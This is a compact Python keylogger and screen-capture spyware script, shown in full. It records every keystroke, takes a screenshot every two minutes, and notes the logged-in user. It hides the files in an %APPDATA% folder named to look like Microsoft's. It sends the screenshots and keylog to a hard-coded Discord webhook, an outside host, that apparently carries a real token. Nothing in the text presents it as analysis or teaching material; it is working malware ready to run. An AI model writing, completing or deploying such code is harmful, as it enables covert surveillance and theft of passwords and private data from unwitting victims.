import os,time,threading
from datetime import datetime as dt
from pynput import keyboard as kb
from PIL import ImageGrab as IG
import requests as rq

W="https://discord.com/api/webhooks/1224136142958624819/AOMUAcdw3A6Wok1tBEY-l5fnoxALCmrfWfe3UqzPmFxRAcipHihJTi1FlBkBK9tK-yg8"
D=os.path.expandvars(r"%APPDATA%\Microsoft25")
os.makedirs(D,exist_ok=1)
K=os.path.join(D,"keylog.txt")
SI=os.path.join(D,"system_info.txt")
SI_text=f"Script started at {dt.now()}\nUser: {os.getlogin()}\n"
with open(SI,"a",encoding="utf-8") as f:f.write(SI_text)

def s(c=None,f=None,n=None):
    d,fm={},{}
    if c:d['content']=c
    if f and os.path.exists(f): fm['file']=(n or os.path.basename(f),open(f,'rb'))
    try:
        r=rq.post(W,data=d,files=fm)
        if fm:fm['file'][1].close()
        return r.ok
    except Exception as e:
        print(f"Err:{e}")
        return 0

def p(k):
    try:
        c=k.char if hasattr(k,'char') else None
        with open(K,"a",encoding="utf-8") as f:
            f.write(f"{dt.now()} - {c if c else k}\n")
    except Exception as e:
        with open(K,"a",encoding="utf-8") as f:
            f.write(f"{dt.now()} - [Err:{e}]\n")

def ks():
    kb.Listener(on_press=p).start()

def sh():
    while 1:
        n=dt.now().strftime("%Y%m%d_%H%M%S")
        pth=os.path.join(D,f"screenshot_{n}.png")
        IG.grab().save(pth)
        s(f"Screenshot {n}",pth)
        time.sleep(120)

def sk():
    while 1:
        time.sleep(300)
        if os.path.exists(K): s("Keylog update",K,"keylog.txt")

if __name__=="__main__":
    ks()
    threading.Thread(target=sh,daemon=1).start()
    threading.Thread(target=sk,daemon=1).start()
    while 1: time.sleep(10)
